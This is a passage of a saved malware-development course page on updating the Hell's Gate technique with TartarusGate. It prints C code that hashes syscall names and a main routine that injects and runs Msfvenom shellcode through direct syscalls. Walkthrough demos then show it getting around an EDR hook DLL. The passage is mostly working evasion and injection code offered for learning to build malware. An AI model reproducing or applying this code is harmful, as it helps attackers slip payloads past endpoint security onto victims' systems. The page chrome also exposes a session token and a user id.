	printf("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n", g_Nt.NtWaitForSingleObject.dwSSn);

	return TRUE;
}
</code></pre>
<p><code>NtAllocateVirtualMemory_CRC32</code>, <code>NtProtectVirtualMemory_CRC32</code>, <code>NtCreateThreadEx_CRC32</code>, and <code>NtWaitForSingleObject_CRC32</code> are the hash values of the respective syscalls.</p>
<h4>Hasher Program</h4>
<p>The syscall hashes are generated using the <em>Hasher</em> program which contains the <code>crc32h</code> hashing function. Hasher prints the values of its <code>crc32h</code>'s function output.</p>
<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;


#define SEED 0xEDB88320
#define STR "_CRC32"

unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // Get next byte.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}

#define HASH(API) crc32h((char*)API)


int main() {

    printf("#define %s%s \t 0x%0.8X \n", "NtAllocateVirtualMemory", STR, HASH("NtAllocateVirtualMemory"));
    printf("#define %s%s \t 0x%0.8X \n", "NtProtectVirtualMemory", STR, HASH("NtProtectVirtualMemory"));
    printf("#define %s%s \t 0x%0.8X \n", "NtCreateThreadEx", STR, HASH("NtCreateThreadEx"));
    printf("#define %s%s \t 0x%0.8X \n", "NtWaitForSingleObject", STR, HASH("NtWaitForSingleObject"));
}

</code></pre>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-719008069-88be2bdc-b34e-4a9b-a338-91df90cd5.png" alt="image"></p>
<h4>Main Function</h4>
<p>The <code>InitializeNtSyscalls</code> function is called first, 
followed by syscalls to perform a local code injection using Msfvenom's 
shellcode. The call to the syscalls is done using the <code>SetSSn</code> and <code>RunSyscall</code> assembly functions previously described.</p>
<pre><code>
int main() {

	NTSTATUS	STATUS		= NULL;
	PVOID		pAddress	= NULL;
	SIZE_T		sSize		= sizeof(Payload);
	DWORD		dwOld		= NULL;
	HANDLE		hProcess	= (HANDLE)-1,	// local process
			    hThread		= NULL;


	// initializing the used syscalls
	if (!InitializeNtSyscalls()) {
		printf("[!] Failed To Initialize The Specified Direct-Syscalls \n");
		return -1;
	}


	// allocating memory
	SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}

	// copying the payload
	memcpy(pAddress, Payload, sizeof(Payload));
	sSize = sizeof(Payload);

	// changing memory protection
	SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, &amp;sSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x00) {
		printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}
	

	// executing the payload
	SetSSn(g_Nt.NtCreateThreadEx.dwSSn);
	if ((STATUS = RunSyscall(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}

	
	// waiting for the payload
	SetSSn(g_Nt.NtWaitForSingleObject.dwSSn);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
		printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}


	printf("[#] Press &lt;Enter&gt; To Quit ... ");
	getchar();
	
	return 0;
}

</code></pre>
<h3>Demo 1 - Without TartarusGate</h3>
<p><code>MalDevEdr.dll</code> is injected into the Hell's Gate 
implementation that does not use TartarusGate to find an SSN. This will 
fail when searching for the SSN, as expected.</p>
<ul>
<li>Injecting <code>MalDevEdr.dll</code> into the Hell's Gate implementation.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-819042962-afbc121a-d298-419a-b1e5-89eef05d8.png" alt="image"></p>
<br>
<ul>
<li>
<code>NtProtectVirtualMemory</code> is hooked.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-919042983-21be24a2-1648-4a06-afe5-d08ededb7.png" alt="q4"></p>
<br>
<ul>
<li>Hell's Gate fails.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-10.png" alt="q3"></p>
<h3>Demo 2 - With TartarusGate</h3>
<p><code>MalDevEdr.dll</code> is injected into the Hell's Gate 
implementation that uses TartarusGate to find an SSN. This 
implementation is able to successfully retrieve the SSN.</p>
<ul>
<li>Injecting <code>MalDevEdr.dll</code> into the Hell's Gate 
implementation that utilizes TartarusGate. Furthermore, breakpoints are 
inserted in several points in the code for further analysis.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-11.png" alt="h1"></p>
<br>
<ul>
<li>Hitting a breaking point when retrieving the SSN of <code>NtProtectVirtualMemory</code>. Since it's hooked, the syscall's opcodes aren't the same as the usual syscall format.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-12.png" alt="h2"></p>
<br>
<ul>
<li>The syscall directly below <code>NtProtectVirtualMemory</code> is unhooked and so its SSN is retrieved instead. The variable <code>idx</code> has a value of 1.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-13.png" alt="h3"></p>
<br>
<ul>
<li>
<code>low</code> is 81 (in decimal) and <code>high</code> is 0. Calculating this neighboring syscall's SSN returns <code>0x51</code> (in hex) or 81 (in decimal)</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-14.png" alt="h4"></p>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-15.png" alt="image"></p>
<br>
<ul>
<li>Since the search path was downward, <code>NtProtectVirtualMemory</code>'s SSN is <code>81 - 1 = 80</code>.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-16.png" alt="h5"></p>
<br>
<ul>
<li>80 in hex is <code>0x50</code>, which is the correct SSN for <code>NtProtectVirtualMemory</code>.</li>
</ul>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-17.png" alt="h6"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand why Hell's Gate fails in certain hooking cases</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand how TartarusGate searches for a SSN</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reimplement mapping injection to use TartarusGate's SSN retrieval approach</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/87"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/88/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/88/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/89"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Updating%20Hell's%20Gate_files/jquery-3.6.0.min.js"></script>
        <script src="Updating%20Hell's%20Gate_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Updating%20Hell's%20Gate_files/app.4474f4d1.css"><link rel="modulepreload" href="Updating%20Hell's%20Gate_files/app.5f3af5ce.js"><link rel="stylesheet" href="Updating%20Hell's%20Gate_files/app.4474f4d1.css"><script type="module" src="Updating%20Hell's%20Gate_files/app.5f3af5ce.js"></script><script src="Updating%20Hell's%20Gate_files/navbar.js"></script>
<script src="Updating%20Hell's%20Gate_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 88;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>